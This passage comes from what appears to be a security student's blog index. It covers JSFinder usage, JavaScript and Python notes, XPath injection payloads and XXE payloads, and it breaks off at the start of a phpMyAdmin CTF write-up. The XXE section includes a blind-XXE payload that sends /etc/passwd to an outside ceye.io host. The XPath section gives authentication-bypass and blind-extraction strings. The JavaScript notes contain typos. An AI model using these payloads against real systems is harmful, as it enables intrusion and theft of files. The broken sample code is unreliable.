&#x6307;&#x5B9A;JS&#xFF1A; python JSFinder.py -f text.txt -j &#x53EF;&#x4EE5;&#x7528;brupsuite&#x722C;&#x53D6;&#x7F51;&#x7AD9;&#x540E;&#x63D0;&#x53D6;&#x51FA;URL&#x6216;&#x8005;JS&#x94FE;&#x63A5;&#xFF0C;&#x4FDD;&#x5B58;&#x5230;txt&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x4E00;&#x884C;&#x4E00;&#x4E2A;&#x3002; &#x6307;&#x5B9A;URL&#x6216;JS&#x5C31;&#x4E0D;&#x9700;&#x8981;&#x52A0;&#x6DF1;&#x5EA6;&#x722C;&#x53D6;&#xFF0C;&#x5355;&#x4E2A;&#x9875;&#x9762;&#x5373;&#x53EF;&#x3002; &#x5176;&#x4ED6; -ou &#x6307;&#x5B9A;&#x6587;&#x4EF6;&#x540D;&#x4FDD;&#x5B58;URL&#x94FE;&#x63A5; &#x4F8B;&#xFF1A; python JSFinder.py -u http://www.mi.com -ou mi_url.txt -os &#x6307;&#x5B9A;&#x6587;&#x4EF6;&#x540D;&#x4FDD;&#x5B58;&#x5B50;&#x57DF;&#x540D; &#x4F8B;&#xFF1A; python JSFinder.py -u http://www.mi.com -os mi_subdomain.txt &#x6CE8;&#x610F; url &#x4E0D;&#x7528;&#x52A0;&#x5F15;&#x53F7; url &#x9700;&#x8981;http:// &#x6216; https:// &#x6307;&#x5B9A;JS&#x6587;&#x4EF6;&#x722C;&#x53D6;&#x65F6;&#xFF0C;&#x8FD4;&#x56DE;&#x7684;URL&#x4E3A;&#x76F8;&#x5BF9;URL &#x6307;&#x5B9A;URL&#x6587;&#x4EF6;&#x722C;&#x53D6;&#x65F6;&#xFF0C;&#x8FD4;&#x56DE;&#x7684;&#x76F8;&#x5BF9;URL&#x90FD;&#x4F1A;&#x4EE5;&#x6307;&#x5B9A;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x94FE;&#x63A5;&#x7684;&#x57DF;&#x540D;&#x4F5C;&#x4E3A;&#x5176;&#x57DF;&#x540D;&#x6765;&#x8F6C;&#x5316;&#x4E3A;&#x7EDD;&#x5BF9;URL&#x3002; &#x622A;&#x56FE; &#x5B9E;&#x6D4B;&#x7B80;&#x5355;&#x722C;&#x53D6;&#xFF1A; &#x5B9E;&#x6D4B;&#x6DF1;&#x5EA6;&#x722C;&#x53D6;&#xFF1A; http://www.oppo.com URL:4426 &#x4E2A; &#x5B50;&#x57DF;&#x540D;&#xFF1A;24 &#x4E2A; http://www.mi.com URL:1043 &#x4E2A; &#x5B50;&#x57DF;&#x540D;&#xFF1A;111 &#x4E2A; http://www.jd.com URL:3627 &#x4E2A; &#x5B50;&#x57DF;&#x540D;&#xFF1A;306 &#x4E2A;","link":"/2019/06/10/JSFinder/"},{"title":"Head First Javascript笔记","text":"JavaScriptHello World.Go to a new world again. BeginThe first program: 1234setTimeout(wakeUpUser, 5000)function wakeUpUser(){ alert(&quot;Yep! love you!!! honny.&quot;)} 123456789101112131415161718192021var skater;var age = 20;var name = &quot;threezh1&quot;;var isBoy = ture/false;//This will not show for others.document.write(&quot;Hello World.&quot;);console.log(&quot;Just like history?&quot;);&lt;script src=&quot;mycode.js&quot;&gt;&lt;/script&gt;GetUserEnter = prompt(&quot;Please enter whatever you want to say!&quot;);document.write(GetUserEnter);//Get a random.This will return a number in (0~1)var randomLoc = Math.random();//If you want get a number in (0~5 haven&apos;t 5 like 4.999...)var randomLoc = Math.random() * 5;//Get a complete number:var randomLoc = Math.floor(Math.random() * 5); Function1234567891011121314151617181920function threezh1(varchar, number){ alert(&quot;What you wanna to say.&quot;); alert(&quot;This is the first parameter:&quot; + varchar); alert(&quot;This is the second parameter:&quot; + varchar); return 0;}threezh1(&quot;Hello World.&quot;, 33);// If a variable is created in outside the function, it is a global variable.// You can use a variable as a function name.var func = function(num){ ...}func(3);// No namewindow.onload = function() { alert(&quot;Yeah, that page loaded/1&quot;);}; Array1234567891011var scores = [10, 20, 33, 50, 60];var myscore = scores[2];scores.length// Create a array objectvar emptyArray = new Array();emptyArray[0] = 33; Object1234567891011121314151617181920212223242526272829303132333435// Create a object and use it.var threezh1 = { name: &quot;threezh1&quot;, age: 20, color: &quot;yellow&quot;, speed: 20 skate: function(){ document.write(&quot;I like play skate!&quot;); if (this.speed &gt; 20){ alert(&quot;Your speed is too fast!&quot;); } }};var myname = threezh1.name;document.write(myname);threezh1.skate();// Create a object.function Dog(name, breed, weight){ this.name = name; this.breed = bread; this.weight = weight;}var fido = new Dog(&quot;Fido&quot;, &quot;Mixed&quot;, 38);// Delete a attribute.delete fido.weight;// Add a attribute.fido.trust = function(person) { ...} DOMThis is a very important content. 123456789101112131415161718192021222324// Get a HtmlElement:var access = document.getElementById(&quot;id_name&quot;);var code = access.innerHTML;alert(code);// The &quot;code&quot; is the text of label who id = id_name.// Ps: This codes should be put after the element.// Change the text of a label:access.innerHTML = &quot;Some other words what you wanna change!&quot;;// If you wanna use a callback function. you can use the window.onload.&lt;script&gt;function init(){ var access = document.getElementById(&quot;id_name&quot;); var code = access.innerHTML; alert(code);}window.onload = init;&lt;/script&gt;// Also, you can us setArribute to change the parameter in the table.access.setArribute(&quot;class&quot;, &quot;redtext&quot;);var ia_name = access.getArribute(&quot;id&quot;); others12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667// Judge a variable&apos;s type:type = tyepof(variable);if (something == null){ ...}// NaN, isn&apos;t a number.if (isNaN(variable) == ture){ alert(&quot;This isn&apos;t a number.&quot;);}== equal=== absolutely equal// String&apos;s lengthvar length = somewords.length// Split the string:stringarray = somewords.charAt// find a word in a string and return a index of this word.var index = somewords.indexOf(&quot;otherword&quot;);// Get a word in two index.var val = somewords.substring(5, 10);// Split a string by a word.var vals = somewords.split(&quot;|&quot;);...// Add a act when the element be clicked.window.onload = init;function init(){ var image = document.getElementById(&quot;zero&quot;); image.onclick = showAnswer;}function showAnswer(){ ...}// Add more act when one of elements be clicked.var images = document.getElementByTagName(&quot;img&quot;);for (var i = 0; i &lt; images.length; i++){ images[i].onclick = showAnswer;}function showAnswer(eventObj){ var image = eventObj.target;//taget can get the name of the element.}// Time:var now = new Date();var dateString = now.toString();var theYear = now.getFullYear();var theDayOfWeek = now.getDay();var birthday = new Date(&quot;May 1, 2019 08:03 pm&quot;);// Array","link":"/2019/01/01/Head First Javascript/"},{"title":"Python动态加载模块、类、函数的几种方式","text":"1. exec()&#x4F7F;&#x7528;exec&#x6765;&#x6267;&#x884C;Python&#x5BFC;&#x5165;&#x6A21;&#x5757;&#x7684;&#x547D;&#x4EE4;&#x3002; 123module_name = &quot;module01&quot;exec(&quot;import &quot; + module_name)module01.echo() 2. __import__()&#x5355;&#x72EC;&#x4F7F;&#x7528;__import__() &#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x52A0;&#x8F7D;&#x6A21;&#x5757;&#xFF0C;&#x4F46;&#x662F;&#x5F53;&#x9700;&#x8981;&#x52A8;&#x6001;&#x52A0;&#x8F7D;&#x7C7B;&#x3001;&#x51FD;&#x6570;&#x65F6;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x914D;&#x5408;getattr&#x6765;&#x5B9E;&#x73B0;&#x3002; &#x5B9E;&#x73B0;&#x6B65;&#x9AA4;&#xFF1A; &#x83B7;&#x53D6;&#x6A21;&#x5757;&#x540D;(module_name) &#x4F7F;&#x7528;__import__(module_name)&#x5BFC;&#x5165;Python&#x6A21;&#x5757; &#x4F7F;&#x7528;getattr(module_name, class_name/function_name)&#x83B7;&#x53D6;&#x7C7B;&#x3001;&#x65B9;&#x6CD5;&#x7684;&#x5BF9;&#x8C61; &#x4F8B;&#x5B50;&#xFF1A; &#x6A21;&#x5757;(module01.py)&#x4E2D;&#x5305;&#x542B;&#x4E00;&#x4E2A;Index&#x7C7B;&#x548C;&#x4E00;&#x4E2A;echo&#x65B9;&#x6CD5;&#x3002;&#x4E3B;&#x7A0B;&#x5E8F;(main.py)&#x4F7F;&#x7528;&#x6A21;&#x5757;&#x540D;&#x52A8;&#x6001;&#x8C03;&#x7528;&#x5176;echo&#x65B9;&#x6CD5;&#x3002; module01.py: 1234class Index: def echo(self, content): print(self) print(content) main.py: 12345678module_name = &quot;module01&quot;class_name = &quot;Index&quot;function_name = &quot;echo&quot;module_object = __import__(module_name) #&#x5C06;&#x6A21;&#x5757;&#x52A0;&#x8F7D;&#x4E3A;&#x5BF9;&#x8C61;module_class = getattr(module_object, class_name) #&#x83B7;&#x53D6;&#x6A21;&#x5757;&#x5F53;&#x4E2D;&#x7684;&#x7C7B;&#x5BF9;&#x8C61;module_class_object = module_class() #&#x5C06;&#x7C7B;&#x5B9E;&#x4F8B;&#x5316;module_class_object.echo(&quot;Hello World&quot;) #&#x8C03;&#x7528;echo&#x65B9;&#x6CD5; &#x6B64;&#x5916;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x8FD9;&#x6837;&#x8C03;&#x7528;&#x7C7B;&#x4E2D;&#x7684;&#x51FD;&#x6570;&#xFF1A; main.py: 12345678910module_name = &quot;module01&quot;class_name = &quot;Index&quot;function_name = &quot;echo&quot;module_object = __import__(module_name) #&#x5C06;&#x6A21;&#x5757;&#x52A0;&#x8F7D;&#x4E3A;&#x5BF9;&#x8C61;module_class = getattr(module_object, class_name) #&#x83B7;&#x53D6;&#x6A21;&#x5757;&#x5F53;&#x4E2D;&#x7684;&#x7C7B;&#x5BF9;&#x8C61;module_function = getattr(module_class, function_name) #&#x83B7;&#x53D6;&#x7C7B;&#x4E2D;&#x65B9;&#x6CD5;&#x5BF9;&#x8C61;module_function(&quot;Hello World&quot;)# &#x6216;&#x8005;&#x76F4;&#x63A5; module_class.echo()# &#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x4F7F;&#x7528;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x8C03;&#x7528;&#x65B9;&#x6CD5;&#xFF0C;&#x65B9;&#x6CD5;&#x7684;&#x53C2;&#x6570;&#x503C;&#x4E0D;&#x9700;&#x8981;&#x52A0;self&#x3002; &#x53C2;&#x8003;&#xFF1A; python &#x52A8;&#x6001;&#x8C03;&#x7528;&#x6A21;&#x5757;&amp;&#x7C7B;&amp;&#x65B9;&#x6CD5; 3. importlib&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x5176;&#x5B9E;&#x662F;__import__() &#x65B9;&#x5F0F;&#x7684;&#x6269;&#x5C55;&#x3002;Python&#x5B98;&#x65B9;&#x6587;&#x6863;&#x63A8;&#x8350;&#x7A0B;&#x5E8F;&#x5F0F;&#x5730;&#x5BFC;&#x5165;&#x6A21;&#x5757;&#x65F6;&#x5E94;&#x8BE5;&#x4F7F;&#x7528; import_module() &#x800C;&#x4E0D;&#x662F;__import__&#x3002; &#x5B9E;&#x73B0;&#x52A8;&#x6001;&#x52A0;&#x8F7D;&#x7684;&#x65B9;&#x5F0F;&#x4E0E;&#x7B2C;&#x4E8C;&#x79CD;&#x7C7B;&#x4F3C;&#xFF1A; module01.py 1234class Index: def echo(self, content): print(self) print(content) main.py 12345678import importlibmodule_name = &quot;module01&quot;class_name = &quot;Index&quot;module_object = importlib.import_module(module_name) #&#x5C06;&#x6A21;&#x5757;&#x52A0;&#x8F7D;&#x4E3A;&#x5BF9;&#x8C61;module_class_object = module_object.Index() #&#x5C06;&#x7C7B;&#x5B9E;&#x4F8B;&#x5316;module_class_object.echo(&quot;Hello World&quot;) #&#x8C03;&#x7528;echo&#x65B9;&#x6CD5; (&#x540C;&#x6837;&#x7684;&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x914D;&#x5408;getattr()&#x4F7F;&#x7528;) &#x4F7F;&#x7528;importlib&#x7684;&#x4E00;&#x4E2A;&#x597D;&#x5904;&#x5C31;&#x662F;&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;reload&#x65B9;&#x6CD5;&#x3002;&#x5728;&#x6A21;&#x5757;&#x5DF2;&#x7ECF;&#x88AB;&#x5BFC;&#x5165;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4F7F;&#x7528;importlib.reload&#x5BFC;&#x5165;&#x65B0;&#x7684;&#x6A21;&#x5757;&#x3002; &#x8BE6;&#x60C5;&#x53EF;&#x89C1;&#xFF1A;importlib &#x2014; import &#x7684;&#x5B9E;&#x73B0;","link":"/2019/07/12/Python动态加载模块的几种方式/"},{"title":"了解Xpath","text":"Learn : http://www.w3school.com.cn/xpath/index.asp Simple noteXpath is a languaga to find information in XML. There are knowledge too much, I don&#x2019;t want to copy. Chose node: 1234567891011121314151617181920212223bookstore chose all children_parameters./bookstore chose root element bookstore./bookstore/book chose all children_paremeters named &quot;root&quot; of bookstore.//book chose all children_parameters no matter where they are.bookstore//book chose all children_paremeters named &quot;root&quot; of bookstore no matter where they are.//@lang chose all attribute named &quot;lang&quot;./bookstore/book[1]/bookstore/book[last()]/bookstore/book[last()-1]/bookstore/book[position()&lt;3]//title[@lang]//title[@lang=&apos;eng&apos;]/bookstore/book[price&gt;35.00]/bookstore/book[price&gt;35.00]/title* ALL node.@* ALL node which have any attribute.node() ALL type of node.//book/title | //book/price//title | //price/bookstore/book/title | //price USE: 12345var xmlDoc=new XMLHttpRequest()Chose nodes:IE : xmlDoc.selectNodes(xpath);Other : xmlDoc.evaluate(xpath, xmlDoc, null, XPathResult.ANY_TYPE,null); XPath InjectionA example: 12345678910111213&lt;users&gt; &lt;user&gt; &lt;firstname&gt;Ben&lt;/firstname&gt; &lt;lastname&gt;Elmore&lt;/lastname&gt; &lt;loginID&gt;abc&lt;/loginID&gt; &lt;password&gt;test123&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;firstname&gt;Shlomy&lt;/firstname&gt; &lt;lastname&gt;Gantz&lt;/lastname&gt; &lt;loginID&gt;xyz&lt;/loginID&gt; &lt;password&gt;123test&lt;/password&gt; &lt;/user&gt; A website use XML to store the username and password. There is his normal query statement: Query basic statement: //user/user[loginID/text()=&apos;abc&apos; and password/text()=&apos;test123&apos;] Only if loginID and password is correct the user can get the result. If Input loginID and password = &apos;&apos; or 1=1 , the hacker can bypass the veryfication. //users/user[LoginID/text()=&apos;&apos;or 1=1 and password/text()=&apos;&apos;or 1=1] So, XPath injection just like SQL, try to use some evil statement to get all content in XML. Practice01Use the Reference 1 to practice: Request = http://localhost/test.php?name=admin&apos; or &#x2018;1&#x2019;=&#x2019;1&amp;pwd xpath=/root/users/user[username/text()=&apos;admin&apos; or &apos;1&apos;=&apos;1&apos; and password/text()=&apos;d41d8cd98f00b204e9800998ecf8427e&apos;] If you don&#x2019;t know the username, you can use tow &#x201C;or&#x201D; to bypass the verification logic. http://localhost/test.php?name=fake&apos; or &apos;1&apos;or&apos;1&amp;pwd=fake It will return all username. 02This is a CTF. It filter all sql injection statement, So we should use xpath to inject. This is important statement: $query=&quot;user/username[@name=&apos;&quot;.$user.&quot;&apos;]&quot;; We can structure user=&apos;]//*|anyword[ First , we close the [] and then we use //* to get all username. 03A example of use XPath with PHP: 1234567891011&lt;peo name=&apos;vk&apos;&gt; &lt;subject&gt; &lt;foo&gt;english&lt;/foo&gt; &lt;score&gt;100&lt;/score&gt; &lt;/subject&gt; &lt;subject&gt; &lt;foo&gt;chinese&lt;/foo&gt; &lt;score&gt;100&lt;/score&gt; &lt;/subject&gt; &lt;password&gt;vk123&lt;/password&gt;&lt;/peo&gt; 1234567891011121314151617181920212223&lt;?phpif (file_exists(&apos;score.xml&apos;)){ $xml = simplexml_load_file(&apos;score.xml&apos;); //&#x83B7;&#x53D6;xml&#x6587;&#x4EF6;&#x91CC;&#x9762;&#x7684;&#x6570;&#x636E; if (isset($_GET[&apos;user&apos;])){ $user = $_GET[&apos;user&apos;]; //&#x6784;&#x9020;&#x8BED;&#x53E5; $en_scr = &quot;//peo[@name=&apos;{$user}&apos;]/subject[contains(foo, &apos;english&apos;)]/score&quot;; $ch_scr = &quot;//peo[@name=&apos;{$user}&apos;]/subject[contains(foo, &apos;chinese&apos;)]/score&quot;; $en_qu = $xml -&gt; xpath($en_scr); $ch_qu = $xml -&gt; xpath($ch_scr); foreach ($en_qu as $key =&gt; $value) { echo $user.&apos;:&lt;br&gt;english is &apos;.$value; } foreach ($ch_qu as $key =&gt; $value) { echo &apos;&lt;br&gt;&apos;.&apos;chinese is &apos;.$value; } }else{ echo &apos;only have three user: vk, tom, helen.&apos;; }}?&gt; $en_scr = &quot;//peo[@name=&apos;{$user}&apos;]/subject[contains(foo, &apos;english&apos;)]/score&quot;; Get the peo of the attribute name=user and then find the score of the child element whose foo is english in the subject. Bypass: name=tom}&apos;] | //* | //*[&apos;{ 04XPath blind injection: Because I haven&#x2019;t the enough example, so I just learn the thought of how to use it in easy way. Use the code of example 01. Judge the nodes&#x2019; number of root. 127.0.0.1/xpath/index.php?name=1&apos; or count(/*)=1 or &apos;1&apos;=&apos;1&amp;pwd=fake Guess the first node. 127.0.0.1/xpath/index.php?name=1&apos; or substring(name(/*[position()=1]),1,1)=&apos;r&apos; or &apos;1&apos;=&apos;1&amp;pwd=fake 127.0.0.1/xpath/index.php?name=1&apos; or substring(name(/*[position()=1]),2,1)=&apos;o&apos; or &apos;1&apos;=&apos;1&amp;pwd=fake &#x2026; result : root Judge the number of next node of root: 127.0.0.1/xpath/index.php?name=1&apos; or count(/root/*)=2 or &apos;1&apos;=&apos;1&amp;pwd=fake Guess the net node of root: 127.0.0.1/xpath/index.php?name=1&apos; or substring(name(/root/*[position()=1]),1,1)=&apos;u&apos; or &apos;1&apos;=&apos;1&amp;pwd=fake 127.0.0.1/xpath/index.php?name=1&apos; or substring(name(/root/*[position()=2]),1,1)=&apos;s&apos; or &apos;1&apos;=&apos;1&amp;pwd=fake &#x2026; result: users,secret Guess the value of username which id = 1: 127.0.0.1/xpath/index.php?name=1&apos; or substring(/root/users/user[id=1]/username,1,1)=&apos;a&apos; or &apos;1&apos;=&apos;1&amp;pwd=fake &#x2026; result: admin DIGIf a website use XML to store privacy information and use XPath to control it and there haven&#x2019;t waf to statement of input. So there is a XPath injection. A lack of example. Maybe the vulunery is difficult to meet. Tipsor and = | Reference xpath&#x6CE8;&#x5165;&#x8BE6;&#x89E3;","link":"/2019/01/01/XPath/"},{"title":"了解XML","text":"Learn&#xFF1A;http://www.w3school.com.cn/xml/xml_intro.asp Simple note&#xFF1A;XMLA simple example of XML&#xFF1A; 12345678910111213&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1 ?&gt;&lt;skate&gt; &lt;people grade=&quot;four&quot;&gt; &lt;name&gt;azhu&lt;/name&gt; &lt;high&gt; three board &lt;/high&gt; &lt;/people&gt; &lt;people grade=&quot;one&quot;&gt; &lt;name&gt;threezhi&lt;/name&gt; &lt;high&gt; three board &lt;/high&gt; &lt;/people&gt;&lt;/skate&gt;`&lt;!-- You should avoid use attribute of XML. --&gt;` In XML, there are five predefined entity reference(&#x5B9E;&#x4F53;&#x5F15;&#x7528;): 12345&amp;lt; &lt;&amp;gt; &gt;&amp;amp; &amp;&amp;apos; &apos;&amp;quot; &quot; A example of load an XML document to XML parser(&#x89E3;&#x91CA;&#x5668;) : 12345678910111213141516171819&lt;script&gt;if (window.XMLHttpRequest){// code for IE7+, Firefox, Chrome, Opera, Safari xmlhttp=new XMLHttpRequest();}else{ // code for IE6, IE5 xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);}xmlhttp.open(&quot;GET&quot;,&quot;note.xml&quot;,false);xmlhttp.send();xmlDoc=xmlhttp.responseXML;document.getElementById(&quot;to&quot;).innerHTML=xmlDoc.getElementsByTagName(&quot;to&quot;)[0].childNodes[0].nodeValue;document.getElementById(&quot;from&quot;).innerHTML=xmlDoc.getElementsByTagName(&quot;from&quot;)[0].childNodes[0].nodeValue;document.getElementById(&quot;message&quot;).innerHTML=xmlDoc.getElementsByTagName(&quot;body&quot;)[0].childNodes[0].nodeValue;&lt;/script&gt; DTDA example about DTD in XML: 123456789101112131415161718&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1 ?&gt;&lt;!DOCTYPE skate[ &lt;!ELEMENT people (name, high)&gt; &lt;!ELEMENT name (#PCDATA)&gt; &lt;!ELEMENT high (#PCDATA)&gt; ]&gt;&lt;skate&gt; &lt;people grade=&quot;four&quot;&gt; &lt;name&gt;azhu&lt;/name&gt; &lt;high&gt; three board &lt;/high&gt; &lt;/people&gt; &lt;people grade=&quot;one&quot;&gt; &lt;name&gt;threezhi&lt;/name&gt; &lt;high&gt; three board &lt;/high&gt; &lt;/people&gt;&lt;/skate&gt; External document declaration: &lt;!DOCTYPE skate SYSTEM &quot;file_path&quot;&gt; PCDATA means parsed character data. The tags in the text will be handled as a flag and the entity will be expand. CDATA means character data and it will not be expand. In DTD , declare an element and a attribute.: 1234567891011&lt;!ELEMENT Element_name category&gt;&lt;!ELEMENT Element_name (content)&gt;&lt;!ELEMENT Element_name (Elemnt1, Element2...)&gt;Empty Element:&lt;!ELEMENT Element_name, EMPTY&gt;An element who just have PCDATA should use #PCDATA to declare.&lt;!ATTLIST name type category defaults&gt;&lt;!ATTLIST payment type CDATA &quot;check&quot;&gt; DTD - Entity(&#x5B9E;&#x4F53;): A entity declare: Internal entity: 12345678DTD:&lt;!ENTITY name &quot;value&quot;&gt;&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;XML:&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt; External entity: 123456DTD:&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;XML:&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt; Parameter entity: 12&lt;!ENTITY %entity_name &quot;value&quot;&gt;&lt;!ENTITY %entity_name SYSTEM &quot;URL&quot;&gt; TryThis is a internal entity: 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot; ?&gt;&lt;!DOCTYPE note[ &lt;!ELEMENT note (name)&gt; &lt;!ENTITY fuck &quot;You&quot;&gt;]&gt;&lt;note&gt;&lt;name&gt;&amp;fuck;&lt;/name&gt;&lt;/note&gt; I don&#x2019;t know why that I can&#x2019;t build a xml within external entity successfully. So I wanan put it away in this time. DIGWhen there is a post , it made up by xml. And the parameter can be control. Mybe there hava a XXE vluntery. We can use some simple xml to test it. 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test[ &lt;!ENTITY foo &quot;Testing&quot;&gt;]&gt;&lt;parameter&gt;&amp;foo;&lt;/parameter&gt; If it return &#x201C;Testing&#x201D;. We can use another to get more information. Normal XXE12345&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;c&gt;&amp;test;&lt;/c&gt; Parameter entity: 12345&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY % test SYSTEM &quot;file:///etc/passwd&quot;&gt; %test;]&gt; If the website return nothing , There is another mean to deal with this problem. Use external entity: XML: 12345&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY test SYSTEM &quot;http://127.0.0.1/shell.dtd&quot;&gt;]&gt;&lt;c&gt;&amp;test;&lt;/c&gt; DTD: 1&lt;!ENTITY foo SYSTEM &quot;file:///etc/passwd&quot;&gt; Blind XXE with ceye.io:12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://ip.port.b182oj.ceye.io/xxe_test&quot;&gt;%remote;]&gt;&lt;root/&gt; We can create a dtd to get echo result(&#x56DE;&#x663E;&#x7ED3;&#x679C;). XML: 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY % payload SYSTEM &quot;file:///etc/passwd&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://*.*.*.*:8080/xml/evil.dtd&quot;&gt; %dtd; %send;]&gt; DTD: 1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://ip.port.b182oj.ceye.io/?xml1=%payload;&apos;&gt;&quot;&gt;%all; If the XEE is exist, ceye will get a GET request. Of course there are many means to get important and private information. But due to my ability, I wanna put it down to learn more important things. XML in PHP&#xFF1A;1234&lt;?php$xml=simplexml_load_file(&quot;note.xml&quot;);print_r($xml);?&gt; Reference hu3sky&#x2019;blog(There is a poc about how to probe intranet) &#x4F7F;&#x7528;&#x672C;&#x5730;DTD&#x6587;&#x4EF6;&#x6765;&#x5229;&#x7528;XXE&#x6F0F;&#x6D1E;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x7ED3;&#x679C;&#x8F93;&#x51FA; &#x6D45;&#x8C08;XXE&#x653B;&#x51FB; XXE&#x6F0F;&#x6D1E;&#x653B;&#x9632; &#x4E2D;&#x56FD;&#x7535;&#x4FE1;&#x67D0;&#x7701;&#x7CFB;&#x7EDF;Blink XXE &#x641C;&#x72D0;&#x7126;&#x70B9;&#x4E3B;&#x7AD9;Blind XXE&#x5229;&#x7528;Cloudeye&#x795E;&#x5668;&#x6D4B;&#x8BD5; &#x5229;&#x7528;&#x7F51;&#x6613;&#x4E00;&#x5904;XXE&#x76F2;&#x6CE8;&#x6F14;&#x793A;&#x5982;&#x4F55;&#x901A;&#x8FC7;cloudeye&#x914D;&#x5408;&#x5B9E;&#x73B0;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x8BFB;&#x53D6; &#x6C49;&#x542F;&#x79D1;&#x6280;&#x667A;&#x80FD;&#x90AE;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E00;&#x4E2A;XXE&#x6587;&#x4EF6;&#x8BFB;&#x53D6;&#x5F15;&#x53D1;&#x7684;&#x8840;&#x6848; Xfire&#x6587;&#x4EF6;&#x8BFB;&#x53D6;&#x6F0F;&#x6D1E;(&#x2026;Service?wsdl) XXE &amp; SQL &#x65B9;&#x7EF4;O2O&#x5546;&#x4E1A;&#x7CFB;&#x7EDF;SQL&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;+XXE&#x5B9E;&#x4F53;&#x6CE8;&#x5165; &#x7528;&#x53CB;&#x4EBA;&#x529B;&#x8D44;&#x6E90;&#x7BA1;&#x7406;&#x8F6F;&#x4EF6;&#x5168;&#x7248;&#x672C;XXE&#x6F0F;&#x6D1E; (XXE FUZZ) [From blind XXE to root-level file read access]https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/","link":"/2019/01/01/XXE_Note/"},{"title":"phpmyadmin 4.8.1任意文件包含漏洞-CTF","text":"&#x9898;&#x76EE;&#x5730;&#x5740;&#xFF1A;http://222.18.158.226:50000/ &#x6253;&#x5F00;&#x4E4B;&#x540E;&#x4E00;&#x4E2A;&#x5F88;&#x5927;&#x7684;&#x6ED1;&#x7A3D;&#x56FE;&#x6807;~&#x6709;&#x4E00;&#x4E2A;&#x94FE;&#x63A5;&#xFF1A;http://222.18.158.226:50000/index.php?file=hint.php &#x70B9;&#x8FDB;&#x53BB;&#x663E;&#x793A;&#xFF1A;flag not here, and flag in ffffllllaaaagggg&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x8FD9;&#x91CC;&#x6CA1;&#x6709;flag&#xFF0C;lag&#x5728;ffffllllaaaagggg&#x91CC;&#x9762;&#x3002;&#x8FD9;&#x4E2A;&#x9875;&#x9762;&#x6E90;&#x7801;&#x4EC0;&#x4E48;&#x90FD;&#x6CA1;&#x6709;~&#x8FD4;&#x56DE;&#x5230;&#x539F;&#x6765;&#x7684;&#x9898;&#x76EE;&#x5730;&#x5740;&#x770B;&#x770B;&#x6E90;&#x7801;&#x3002; &#x5728;&#x6E90;&#x7801;&#x5F53;&#x4E2D;&#x53D1;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;&#x6CE8;&#x91CA;&#xFF1A;&#x6309;&#x7167;&#x524D;&#x9762;hint&#x94FE;&#x63A5;&#x7684;&#x5F62;&#x5F0F;&#x8FDB;&#x5165;&#x53D1;&#x73B0;&#x4E00;&#x6BB5;php&#x4EE3;&#x7801;&#xFF1A; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 class emmm { public static function checkFile(&amp;$page) { $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; //&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A;&#x767D;&#x540D;&#x5355;&#x3002;&#x53EA;&#x6709;file&#x7684;&#x540D;&#x5B57;&#x5728;&#x8FD9;&#x91CC;&#x540D;&#x5355;&#x7684;&#x624D;&#x53EF;&#x4EE5;&#x5F80;&#x4E0B;&#x7EE7;&#x7EED;&#x8FDB;&#x884C;&#x3002;&#x53EA;&#x6709;source.php&#x4E0E;hint.php&#x3002; if (! isset($page) || !is_string($page)) { echo &quot;you can&apos;t see it&quot;; return false; } if (in_array($page, $whitelist)) { //&#x5224;&#x65AD;file&#x9875;&#x9762;&#x662F;&#x5426;&#x5728;&#x767D;&#x540D;&#x5355;&#x91CC;&#x9762;&#x3002; return true; } $_page = mb_substr( //mb_substr 